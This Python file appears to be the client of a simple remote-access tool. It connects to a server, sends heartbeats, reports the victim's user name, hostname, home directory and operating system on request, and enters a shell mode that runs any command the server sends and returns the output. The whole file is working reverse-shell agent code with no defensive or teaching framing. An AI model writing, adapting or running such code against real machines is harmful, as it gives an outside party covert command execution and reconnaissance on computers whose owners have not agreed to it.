import json
import os
import platform
import socket
import subprocess
import threading
from time import sleep
import uuid

defaultHost='127.0.0.1'
defaultPort=9999

def processShell(shellCommand):
	shellOutput='$ack-shell '
	
	if len(shellCommand) > 0:
		if shellCommand[:2] == 'cd':
			os.chdir(shellCommand[3:])
			shellOutput+="cwd changed to "+os.getcwd()
			
		else:
			cmd = subprocess.Popen(shellCommand[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = cmd.stdout.read() + cmd.stderr.read()
			output_str = str(output_bytes, "utf-8")
			shellOutput+=output_str
	
	return(shellOutput)
                
def buildIdentPackage():
	identPackage={
		'uuid':str(uuid.uuid4()),
		'os':os.name+":"+platform.system()+":"+platform.release(),
		'user':os.getlogin(),
		'home':os.path.expanduser("~"),
		'host':socket.gethostname()
	}
	return(identPackage)

def encodeIdentPackage(identPackage):
	jsonPackage=json.dumps(identPackage);
	return(jsonPackage)

def maintainPulse(sockClient):
	pulseSequence=0;
	pulseCode=''
	while(True):
		sleep(30)
		pulseCode="$hb "+str(pulseSequence)
		sockClient.send(pulseCode.encode())
		pulseSequence+=1
		
def connectServer(hostIp,hostPort):
	sockState='receive' # need special state for streams, like shell mode
	sockClient=socket.socket()
	sockClient.connect((hostIp,hostPort))
	
	print("[>]\tconnected. going into loop to preserve connection. ctrl+c to abort")
	
	threadPulse=threading.Thread(target=maintainPulse,args=(sockClient,))
	threadPulse.start()
	
	while(True):
		
		sockBuffer=sockClient.recv(2048).decode()
		if(sockBuffer):
			match sockState:
				case 'shell':	# connection in shell statae
					match sockBuffer:
						case '$end-shell':
							sockState='receive'
						case _:	# process command as shell
							shellOut=processShell(sockBuffer)
							sockClient.send(shellOut.encode())
							
				case _:	# connection in regular state
					match sockBuffer:
						case '$req-ident':
							print("[>]\treceived req-ident, sending json package")
							sockClient.send(encodeIdentPackage(buildIdentPackage()).encode())
						case '$ack-ident':
							print("[>]\treceived ack-ident");
						case '$req-shell':
							print("[>]\treceived req-shell, opening...")
							sockState='shell'
						case _:
							print("[>]\tdata received:",sockBuffer)
	
print("[>]\tattempting to connect to",defaultHost+":"+str(defaultPort))
connectServer(defaultHost,defaultPort)
